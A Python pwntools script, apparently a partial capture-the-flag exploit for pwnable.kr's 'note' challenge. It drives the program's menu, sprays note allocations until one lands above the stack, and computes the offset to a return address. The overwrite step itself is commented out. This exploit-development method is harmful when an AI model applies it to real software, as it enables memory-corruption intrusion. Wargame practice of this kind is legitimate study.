from pwn import *
import re

#context.log_level = 'error'
# r2 -d rarun2 program=note aslr=no -a x86 -b32

"""note.rr2
#!/usr/bin/rarun2
program=./note
aslr=no
listen=9019
"""

host = '0'
host = 'pwnable.kr'

#s = ssh(host='pwnable.kr', user='note', password='guest', port=2222)
#conn = s.process('./note', aslr=False)
conn = remote(host, 9019)

iteraciones = 1
notas = []

def create_note():
	global iteraciones
	iteraciones += 1
	conn.sendline('1')
	line = conn.readuntil('- Select Menu -')
	if 'memory sults are fool' in line:
		print 'Error: ' + line
		return
	rta = re.search(r'note created\. no (\d+)\s*\[(\w+)\]', line)
	num = rta.group(1)
	addr = rta.group(2)
	return num, addr

def write_note(nro, text):
	global iteraciones
	iteraciones += 1
	conn.sendline('2')
	conn.readuntil('note no?\n')
	conn.sendline(str(nro))
	line = conn.recvline()
	if 'empty' in line or 'index out of range' in line:
		print 'Error: ' + line
		return
	conn.send(text + '\n')
	conn.readuntil('5. exit\n')

def read_note(nro):
	global iteraciones
	iteraciones += 1
	conn.sendline('3')
	conn.sendline(str(nro))
	line = conn.recvline()
	if 'empty' in line or 'index out of range' in line:
		print 'Error: ' + line
		return
	text = conn.readuntil('- Select Menu -')
	conn.readuntil('5. exit\n')
	return text.rstrip('\n- Select Menu -')

def delete_note(nro):
	global iteraciones
	iteraciones += 1
	conn.sendline('4')
	conn.readuntil('note no?\n')
	conn.sendline(str(nro))
	line = conn.recvline()
	if 'already empty slut!' in line or 'index out of range' in line:
		print 'Error: ' + line
		return

def exit():
	global iteraciones
	iteraciones += 1
	conn.sendline('5')

def secret_menu(text):
	global iteraciones
	iteraciones += 1
	conn.sendline('201527')
	conn.readuntil('pwn this\n')
	conn.send(text)

def test():
	num, addr = create_note()
	write_note(num, 'test!')
	a = read_note(num)
	print a
	delete_note(num)
	return

def get_note_ontop_of_stack():
	global notas
	while len(notas) != 255:
		num, addr = create_note()
		addr = int(addr, 16)
		if addr < 0xfffdd000 and addr > 0xf7ffe000:
			notas.append((num, addr))
			print 'aloco: {:d}, iteraciones: {:d}'.format(len(notas), iteraciones)
		else:
			delete_note(num)
	while len(notas) != 256:
		num, addr = create_note()
		addr = int(addr, 16)
		if addr == 0xfffdc000:
			notas.append((num, addr))
			return num, addr
		else:
			delete_note(num)

def main():
	conn.readuntil('5. exit\n')
	num, addr = get_note_ontop_of_stack()
	print 'nota encima del stack\naddr: {}'.format(hex(addr))
	print str(iteraciones)
	#write_note(num, 'A' * 4096)
	ret_addr = 0xffffd55c - (1072 * iteraciones)
	distancia = ret_addr - addr
	print('distancia: {:d}\n'.format(distancia))
	print('exito!')
	return


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		pass
